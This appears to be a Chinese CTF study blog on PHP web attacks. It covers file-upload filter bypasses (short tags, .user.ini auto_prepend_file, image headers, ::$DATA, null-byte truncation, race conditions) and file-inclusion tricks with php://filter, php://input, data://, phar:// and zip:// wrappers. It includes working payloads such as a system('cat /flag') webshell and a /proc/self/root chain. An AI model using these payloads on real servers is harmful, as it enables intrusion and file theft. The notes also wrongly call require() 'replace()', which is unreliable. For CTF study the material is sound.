<p><a data-fancybox="gallery" data-src="/Web-study/image-20220815234910350.png"><img src="/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></a></p>
<h2 id="六、文件上传"><a href="#六、文件上传" class="headerlink" title="六、文件上传"></a>六、文件上传</h2><h3 id="1-多重过滤绕过"><a href="#1-多重过滤绕过" class="headerlink" title="1.多重过滤绕过"></a>1.多重过滤绕过</h3><p><u><strong>下面是以攻防世界的一道easyupload的wp讲解一些情形的绕过方式</strong></u></p>
<p>这里需要绕过的点如下</p>
<blockquote>
<ul>
<li>检查文件内容是否有<code>php</code>字符串</li>
<li>检查后缀中是否有<code>htaccess</code>或<code>php</code></li>
<li>检查文件头部信息</li>
<li>文件<code>MIME</code>类型</li>
</ul>
</blockquote>
<h4 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h4><p>对于<u>第一点</u>可以利用<strong>短标签</strong>绕过，例如 <code>&lt;?=phpinfo();?&gt;</code></p>
<blockquote>
<p>把<code>short_open_tag</code>字段改为<code>On</code>，就可以实现短标签功能</p>
<p>短标签：<br>1.能正常解析类似于这样形式的php文件： <code>phpinfo() ?&gt;</code>  </p>
<p>2.使用<code>&lt;?=$a?&gt;</code>的形式输出，在短标签看来，<code>&lt;?=$a?&gt;</code></p>
<p>3.<code>&lt;?=(表达式)?&gt;</code><br>就相当于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>正确：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>报错：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从这个对比试验我们可以看出：<br>在短标签模式下，<br>我们执行php语句php函数，都用类似于这样形式的php文件：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">phpinfo</span>();?&gt;</span><br></pre></td></tr></table></figure>

<p>但是我们要输出一个flag，或者变量时，使用<code>&lt;?=$a?&gt;</code>的形式输出</p>
</blockquote>
<h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>对于<u>第二点</u>可以通过上传<code>.user.ini</code>以及正常<code>jpg</code>文件来进行<code>getshell</code>,可以参考以下文章</p>
<blockquote>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
</blockquote>
<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>
<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>
<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">.<span class="keyword">user</span>.ini内容</span><br><span class="line"></span><br><span class="line">auto_prepend_file=<span class="number">5</span>.jpg</span><br><span class="line"></span><br><span class="line">这样.<span class="keyword">user</span>.ini当前目录下的文件会自动包含图片🐎，从而让我们成功拿到<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>

<p><u>第三点</u>绕过方式即在文件头部添加一个图片的<strong>文件头</strong>，比如<code>GIF89a</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">JPG</span> ：FF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF</span>(相当于文本的GIF89a)：<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PNG</span>： <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span></span><br></pre></td></tr></table></figure>

<p><u>第四点</u>绕过方法即修改上传时的<code>Content-Type</code></p>
<p>因此最终的<code>payload</code>为：<br> 上传<code>.user.ini</code>，内容为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure>

<p>上传a.jpg，内容为</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-文件类型"><a href="#2-文件类型" class="headerlink" title="2.文件类型"></a>2.文件类型</h3><p><a data-fancybox="gallery" data-src="/Web-study/20200226180218842.png"><img src="/Web-study/20200226180218842.png" alt="20200226180218842"></a></p>
<h3 id="3-其他绕过"><a href="#3-其他绕过" class="headerlink" title="3.其他绕过"></a>3.其他绕过</h3><h4 id="1）-DATA绕过"><a href="#1）-DATA绕过" class="headerlink" title="1）::$DATA绕过"></a>1）::$DATA绕过</h4><blockquote>
<p>● 绕过⽅法：</p>
<p>○ 通过抓取上传数据包，修改上传的⽂件后缀，实现上传。</p>
<p>绕过原理：</p>
<p>● 与上⾯题相⽐呢这个道题去掉了：$file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext);&#x2F;&#x2F;去除字符</p>
<p>串::$DATA 这⾏代码。</p>
<p>● ::$DATA 是什么意思呢？必须是windows, 必须是php, 必须是那个源⽂件，php在window的时候如</p>
<p>果⽂件名+”::$DATA”会把::$DATA之后的数据当成⽂件流处理,不会检测后缀名.且持”::$DATA”之前</p>
<p>的⽂件名</p>
<p>● 他的⽬的就是不检查后缀名</p>
</blockquote>
<h4 id="2）点-空格-点绕过"><a href="#2）点-空格-点绕过" class="headerlink" title="2）点+空格+点绕过"></a>2）点+空格+点绕过</h4><blockquote>
<p>例如，只允许上传.jpg|.png|.gif后缀的⽂件！</p>
<p>● 绕过⽅法：</p>
<p>○ 通过抓取上传数据包，修改上传的⽂件后缀，实现上传。</p>
<p>绕过原理：</p>
<p>● 在windows系统下，如果⽂件名以“.”或者空格作为结尾，系统会⾃动删除“.”与空格，利⽤此特性</p>
<p>也可以绕过⿊名单验证。apache中可以利⽤点结尾和空格绕过，asp和aspx中可以⽤空格绕过。</p>
<p>● 经过脚本⼀系列的处理之后原本.php. .的后缀名变成了.php. ，</p>
<p>⽽由于Windows的特性，⼜将⽂件末尾的点给去除了，</p>
<p>最终就存的时候.php的⽂件。同理也可以上传.htaccess. .等⽂件。。。</p>
<p>(就算没有经过脚本的处理,.php. .在windows中也是会被存储为.php)</p>
</blockquote>
<h4 id="3）00截断"><a href="#3）00截断" class="headerlink" title="3）00截断"></a>3）00截断</h4><blockquote>
<p>绕过原理：</p>
<p>● 这时候就要利⽤0x00截断原理了，具体原理是 系统在对⽂件名的读取时，如果遇到0x00，就会认</p>
<p>为读取已结束。</p>
<p>● 但要注意是⽂件的16进制内容⾥的00，⽽不是⽂件名中的00 ！！！就是说系统是按16进制读取⽂</p>
<p>件（或者说⼆进制），</p>
<p>● 遇到ascii码为零的位置就停⽌，⽽这个ascii码为零的位置在16进制中是00，⽤0x开头表示16进</p>
<p>制，也就是所说的0x00截断</p>
<p>● 当系统读取到0x00时，认为已经结束，不会再读取后⾯将要拼接的13.jpg,认为是php⽂件，</p>
<p>完成绕过。</p>
<p>%<strong>00</strong>截断 与 <strong>0</strong>x<strong>00</strong>截断的区别？</p>
<p>● 地址上⾯⽂件命名的区别。</p>
<p>● %00上是建⽴在地址信息上的</p>
<p>● 0x00 ⽂件</p>
<p>● 操作⽅法基本⼀致。</p>
<p>%<strong>00</strong>截断 与 <strong>0</strong>x<strong>00</strong>截断的实战中的区别？</p>
<p>● 平时⼀定要多观察⼀下数据包，数据包中包含了很多参数，很多参数可以进⾏修改。</p>
</blockquote>
<h4 id="4）二次渲染-条件竞争"><a href="#4）二次渲染-条件竞争" class="headerlink" title="4）二次渲染+条件竞争"></a>4）二次渲染+条件竞争</h4><blockquote>
<p>⼆次渲染：就是根据⽤户上传的图⽚，新⽣成⼀个图⽚，将原始图⽚删除，将新图⽚添加到数据库中。<br>⽐如⼀些⽹站根据⽤户上传的头像⽣成⼤中⼩不同尺⼨的图像</p>
</blockquote>
<blockquote>
<p>条件竞争就是在，当二次渲染先把文件移动到储存目录后，才判断文件是否合法时<br>就产⽣了漏洞，会有⼀个短暂的时间将我们上传的webshell存储在⽬录下，且以我们上传的<br>⽂件名的形式</p>
<p>但是这个时间相当相当短暂，以⾄于，你打开上传⽬录，点击上传⽂件，你连影⼦都看不到就已经<br>没了，</p>
<p>所以这个时候我们可以使⽤burpsuite，我们先抓包，然后发送到intruder模块。<br>点击clear去除所有参数，然后payload选择⽆，并且选择持续发包。</p>
</blockquote>
<blockquote>
<p>⼆次渲染只能靠这个条件竞争去绕过么？<br>○ ⼆次渲染：说的是这个技术叫做⼆次渲染，不是说⼆次渲染有漏洞。<br>○ 有漏洞可利⽤的原因是因为，他是在⽂件上传之后才有的后续操作，第⼀步的时候已经将⽂件<br>上传到服务器上了。<br>○ 如果这个⼆次渲染在第⼀步之前，这个⼆次渲染是没有任何问题的。<br>○ ⼆次渲染不是漏洞，是⼀种技术，是⼀种逻辑上的验证，条件竞争。<br>○ 利⽤条件竞争，防⽌他第⼆步操作</p>
</blockquote>
<hr>
<h2 id="七、文件包含"><a href="#七、文件包含" class="headerlink" title="七、文件包含"></a>七、文件包含</h2><h3 id="1-文件包含的四个函数："><a href="#1-文件包含的四个函数：" class="headerlink" title="1.文件包含的四个函数："></a>1.文件包含的四个函数：</h3><p>1.include():将在其被调用的位置处包含一个文件。包含一个文件与在该语句所在位置复制制定文件的数据具有相同内容的效果。使用include()时可以忽略括号。</p>
<p>2.include_once():在脚本执行期间包含并运行指定文件。此行为和 include() 语句类似，<u><strong>唯一区别是include_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含。</strong></u></p>
<p>3.replace() :很大程度上与include相同，都是将一个模板文件包含到require调用坐在的位置。</p>
<p>require和include之间有两点重要的区别:</p>
<p>1.无论require的位置如何，制定文件都将包含到出现require的脚本中。例如，即使require放在计算结果为假的if语句中，依然会包含指定文件。<br>2.require出错时，脚本将停止运行，而在使用include的情况下，脚本将继续执行。</p>
<p>4.replace_once():在脚本执行期间包含并运行指定文件。此行为和 require() 语句类似，<u><strong>唯一区别是require_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含</strong></u></p>
<h4 id="require-once-多次包含"><a href="#require-once-多次包含" class="headerlink" title="*require_once()多次包含"></a><code>*require_once()</code>多次包含</h4><p><u><strong>下面是一篇关于<code>require_once被使用后不能再使用怎么绕开</code>的文章，本人在2022年5月Dest0g3二次招新比赛遇到类似，特此记录</strong></u></p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
</blockquote>
<blockquote>
<p><code>require_once()</code><br>在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>var<span class="regexp">/www/</span>html/flag.php</span><br></pre></td></tr></table></figure>
</blockquote>
<p>下面该题代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">//find something in flag1.php </span></span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$d</span>, FILTER_VALIDATE_URL)) &#123;   </span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$d</span>);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;lai&quot;</span>) !== <span class="literal">false</span> &amp;&amp;</span><br><span class="line">  <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;ya&quot;</span>) !== <span class="literal">false</span>)  &#123;       </span><br><span class="line">            @<span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you can not pass&quot;</span>);     </span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/labour$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line">                  @<span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$d</span>);       </span><br><span class="line">                  <span class="keyword">echo</span> (<span class="variable">$a</span>);     </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;                                      <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);     </span><br><span class="line">                                    &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;why?&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>文章关键：</strong></p>
<p><u><strong>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</strong></u></p>
<p><u><strong>今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</strong></u></p>
<p><u><strong>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过</strong></u></p>
<p>payload:</p>
<p>?d&#x3D;0:&#x2F;&#x2F;labour&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flll1ag2.txt&amp;ctf&#x3D;laiya</p>
<h3 id="2-php伪协议"><a href="#2-php伪协议" class="headerlink" title="2.php伪协议"></a>2.php伪协议</h3><p>内容来自于<a href="https://blog.csdn.net/qz362228/article/details/124359070">https://blog.csdn.net/qz362228/article/details/124359070</a></p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803155611860.png"><img src="/Web-study/image-20230803155611860.png" alt="image-20230803155611860"></a></p>
<h4 id="1-php-协议"><a href="#1-php-协议" class="headerlink" title="1.php:&#x2F;&#x2F;协议"></a>1.php:&#x2F;&#x2F;协议</h4><p><strong>·条件：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:<span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line">allow_url_include #仅php://<span class="keyword">input</span> php://stdin php://memory php://<span class="keyword">temp</span> 需要<span class="keyword">on</span></span><br></pre></td></tr></table></figure>

<p><strong>·作用：</strong></p>
<blockquote>
<p><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
</blockquote>
<p><strong>·说明</strong>：</p>
<blockquote>
<p>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器</p>
</blockquote>
<h4 id="2-php-filter伪协议"><a href="#2-php-filter伪协议" class="headerlink" title="2.php:&#x2F;&#x2F;filter伪协议"></a>2.php:&#x2F;&#x2F;filter伪协议</h4><p><strong>·条件</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>只是<code>读取</code>，需要开启<code>allow_url_fopen</code>，不需要开启<code>allow_url_include</code></p>
</blockquote>
<p><strong>·说明：</strong></p>
<blockquote>
<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写<br>①输出进行<code>base64</code>加密后的信息</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure>

<p>②获得将base64加密后的信息后，再将其解密，得出原信息</p>
</blockquote>
<h5 id="绕过base过滤"><a href="#绕过base过滤" class="headerlink" title="绕过base过滤"></a>绕过base过滤</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/string.rot13/</span>resource=flag.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。</p>
</blockquote>
<h5 id="绕过对参数限制"><a href="#绕过对参数限制" class="headerlink" title="绕过对参数限制"></a>绕过对参数限制</h5><p>比如</p>
<blockquote>
<p>preg_match(“&#x2F;NewStar&#x2F;i”,$_GET[‘file’])</p>
</blockquote>
<p>php:&#x2F;&#x2F;filter协议在&#x2F; 后面可以添加任意字符,不会影响结果的输出，如下，将字符串加入到resource前面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/string.rot13/NewStar/resource=</span></span><br></pre></td></tr></table></figure>



<h4 id="3-php-input（读取POST数据）"><a href="#3-php-input（读取POST数据）" class="headerlink" title="3.php:&#x2F;&#x2F;input（读取POST数据）"></a>3.php:&#x2F;&#x2F;input（读取POST数据）</h4><p><strong>·条件</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span></span><br></pre></td></tr></table></figure>

<p><strong>·说明</strong></p>
<blockquote>
<p>可以访问请求的原始数据的只读流。在post请求中能查看请求的原始数据，<u><strong>并将post请求中的post数据当作php代码执行</strong></u>。（只读流是说只能进行读操作的数据）</p>
</blockquote>
<p><code>例如</code></p>
<p>下面的POST数据里的命令就会被执行</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220801143739625.png"><img src="/Web-study/image-20220801143739625.png" alt="image-20220801143739625"></a></p>
<blockquote>
<p>即可以<u>直接读取到POST上</u>没有经过解析的原始数据。 <strong>enctype&#x3D;”multipart&#x2F;form-data”</strong> 的时候 php:&#x2F;&#x2F;input 是<strong>无效</strong>的</p>
</blockquote>
<p><code>注</code> ：</p>
<blockquote>
<p>查看当前运行的是哪个php.ini<br>2,3需要将php可执行加入环境变量, 如果没有加,那么请使用php可执行文件所在位置的完整路径代替</p>
</blockquote>
<blockquote>
<ol>
<li></li>
</ol>
<p>打印出<code>phpinfo();</code> 找到<code>Loaded Configuration File</code>那一行</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154754765.png"><img src="/Web-study/image-20230803154754765.png" alt="image-20230803154754765"></a></p>
<blockquote>
<ol start="2">
<li></li>
</ol>
<p>命令行输入</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">php</span> -<span class="variable">i</span> |<span class="variable">grep</span> <span class="variable">php.ini</span>（<span class="variable">php</span> -<span class="variable">i</span>其实就是输出<span class="function"><span class="title">phpinfo</span>();)</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">php -r “phpinfo();” <span class="string">|grep php.ini</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="4-file-伪协议（读取文件内容）"><a href="#4-file-伪协议（读取文件内容）" class="headerlink" title="4.file:&#x2F;&#x2F;伪协议（读取文件内容）"></a>4.file:&#x2F;&#x2F;伪协议（读取文件内容）</h4><p>   <strong>·条件</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span> （均不受影响）</span><br></pre></td></tr></table></figure>

<p>打<code>ctf</code>中常用于读取本地文件</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>:<span class="comment">//C:\Windows\System32\drivers\etc\hosts</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154806812.png"><img src="/Web-study/image-20230803154806812.png" alt="image-20230803154806812"></a></p>
<h4 id="5-phar-伪协议-读取压缩包文件内容"><a href="#5-phar-伪协议-读取压缩包文件内容" class="headerlink" title="5.phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)"></a>5.phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)</h4><p><strong>·条件</strong></p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (均不受影响)</span><br></pre></td></tr></table></figure>

<p><code>注</code>：</p>
<blockquote>
<p>php 版本大于等于<code>5.3.0</code>，压缩包需要是<code>zip</code>协议压缩，<code>rar</code>不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
</blockquote>
<p><strong>·格式</strong></p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=phar:<span class="comment">//压缩包名/内部文件名</span></span><br></pre></td></tr></table></figure>

<p>例，</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">phar:</span><span class="comment">//x.zip/x.php</span></span><br></pre></td></tr></table></figure>

<h4 id="6-zip-伪协议"><a href="#6-zip-伪协议" class="headerlink" title="6.zip:&#x2F;&#x2F;伪协议"></a>6.zip:&#x2F;&#x2F;伪协议</h4><blockquote>
<p>zip伪协议和phar协议类似，但是用法不一样（url不同）</p>
</blockquote>
<p><strong>·条件</strong></p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (均不受影响)</span><br></pre></td></tr></table></figure>

<p><strong>·格式</strong></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">zip</span>:<span class="comment">//[压缩文件绝对路径]#[压缩文件内的子文件名]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：#[压缩文件内的子文件名]是指文件名不包含后缀，如下面shell.php，只写shell</p>
</blockquote>
<p>例，</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">zip:</span>//D:\phpstudy\WWW\<span class="keyword">x</span>.zip<span class="variable">%23</span>shell       #-&gt;<span class="variable">%23</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果限制了上传只能其他格式，比如png图片等等，也可用zip:&#x2F;&#x2F;，将一个一句话木马【cmd.php】加入到一个压缩包里面【cmd.zip】，然后重命名后缀名.zip改成.png，</p>
<p>然后根据上传的路径和图片名字，访问，</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?page=zip:<span class="regexp">//</span>.<span class="regexp">/assets/img</span><span class="regexp">/upload/</span>xxxx.png%<span class="number">23</span>cmd</span><br></pre></td></tr></table></figure>


</blockquote>
<h4 id="7-data-伪协议-读取文件"><a href="#7-data-伪协议-读取文件" class="headerlink" title="7.data:&#x2F;&#x2F;伪协议(读取文件)"></a>7.data:&#x2F;&#x2F;伪协议(读取文件)</h4><blockquote>
<p>（可以直接达到执行php代码的效果）<br>和<code>php://input</code>很像，<code>php://input</code>以<code>post</code>提交数据那样提交数据，<br><code>data://</code>是以<code>get</code>方式提交数据，也是可以执行提交的脚本</p>
</blockquote>
<p><strong>·格式</strong></p>
<blockquote>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo()<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>如果对特殊字符进行了过滤，可以通过base64编码后再输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data://text/plain;<span class="built_in">base64</span>,<span class="built_in">base64</span>加密的代码</span><br></pre></td></tr></table></figure>

<p>可配合<a href="https://www.cnblogs.com/xiaozi/p/7831529.html">php命令执行漏洞</a>，实现对一些数据的获取<br>如：<code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
</blockquote>
<h4 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h4><blockquote>
<p><a href="https://blog.csdn.net/dreamthe/article/details/121765876">参考实例1</a></p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/106658417">参考实例2</a></p>
</blockquote>
<h3 id="3-绕过"><a href="#3-绕过" class="headerlink" title="3.绕过"></a>3.绕过</h3><h4 id="1）路径长度绕过后缀"><a href="#1）路径长度绕过后缀" class="headerlink" title="1）路径长度绕过后缀"></a>1）路径长度绕过后缀</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=@$_GET[<span class="string">&#x27;123&#x27;</span>];</span><br><span class="line"><span class="title function_">include</span>($a.<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如果限制了文件类型，比如这里只能包含<code>html</code>后缀的文件，那么就可以使用此方法</p>
<p><code>操作系统存在最大路径长度的限制</code></p>
<blockquote>
<p>windows系统，文件名最长256个字符</p>
<p>linux系统，文件名最长4096个字符(浏览器最多只能输入300多个字符，所以需要抓包)<br>前面加.&#x2F;.&#x2F;.&#x2F;.&#x2F;…………xx.php</p>
</blockquote>
<p>可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，<code>导致扩展名被中途截断</code></p>
